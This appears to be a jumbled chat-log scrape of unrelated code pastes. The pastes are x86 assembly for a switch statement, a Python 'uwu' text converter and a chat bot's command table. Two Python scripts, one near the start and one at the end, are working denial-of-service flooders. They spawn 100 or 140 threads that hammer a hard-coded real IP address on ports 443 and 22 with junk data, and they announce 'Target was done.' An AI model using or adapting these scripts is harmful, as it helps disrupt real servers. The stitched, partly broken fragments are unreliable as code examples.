.LC1:
        .string "B"
.LC2:
        .string "C"
.LC3:
        .string "awa!"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     BYTE PTR [rbp-1], 66
        movsx   eax, BYTE PTR [rbp-1]
        cmp     eax, 67
        je      .L2
        cmp     eax, 67
        jg      .L3
        cmp     eax, 65
        je      .L4
        cmp     eax, 66
        je      .L5
        jmp     .L3
.L4:
        mov     edi, OFFSET FLAT:.LC0
        call    puts
        jmp     .L6
.L5:
        mov     edi, OFFSET FLAT:.LC1
        call    puts
        jmp     .L6
.L2:
        mov     edi, OFFSET FLAT:.LC2
        call    puts
        jmp     .L6
.L3:
        mov     edi, OFFSET FLAT:.LC3
        call    puts
.L6:
        mov     eax, 0
        leave
        ret
```

import socket
from threading import Thread
def a():
	while True:
		s = socket.socket()
		try:
			s.connect(("39.105.127.10",443))
		except TimeoutError:
			print("Target was done. ;)")
		else:
			while True:
				try:
					s.send(b"SBFISH"*1200)
					print("-",end="")
				except Exception as error:
					print("+",end="")
					break
for i in range(100):
	Thread(target=a).start()

```python
import random
def convert(res):
    words=res.split(" ")
    result=""
    for word in words:
        if len(word) != 0:
            word=word.replace("r","w")
            if word[0] == "l":
                word=word.replace("l","w",1)
            if word[0] == "t":
                word=word.replace("t","tt",1)
            if word[-1] == "s":
                word = word.rstrip("s")
                word += "sh"
            result+=word+" "
    lines=result.split("\n")
    result=""
    for line in lines:
        sth=random.choice(["*uwu*","","*uwu* *blushes*"])
        line+=sth
        if "beluga" in line.lower() and "*blushes*" not in line:
            line+=" *blushes*"
        if random.choice([True,True,False]):
            firstChar=line[0]
            changed=f"{firstChar}-{firstChar}"
            line=line.replace(firstChar,changed,1)
        result+=line+"\n"
        result.rstrip("\n")
    return result.rstrip(" ").rstrip("\n")
    
```

[QCkYle] ModBot
Hokay, hopefully this helps:
| Command | Param | Info |
|-|-|-|
| ~add | <trip> | Add ModBot user |
| ~remove | <trip> | Remove ModBot user |
| ~kick | <nick> | Remove user from channel |
| ~lockroom |  | Prevent users from joining this channel |
| ~unlockroom |  | Allow users to join this channel |

ELIZA can help more if you need it, google it.
RIP original ModBot. . .

```python
import socket
from threading import Thread
def a():
	while True:
		s = socket.socket()
		try:
			s.connect(("39.105.127.10",22))
		except TimeoutError:
			print("Target was done. ;)")
		else:
			while True:
				try:
					s.send(b"SBFISH"*2200)
					print("-",end="")
				except Exception as error:
					print("+",end="")
					break
for i in range(140):
	Thread(target=a).start()
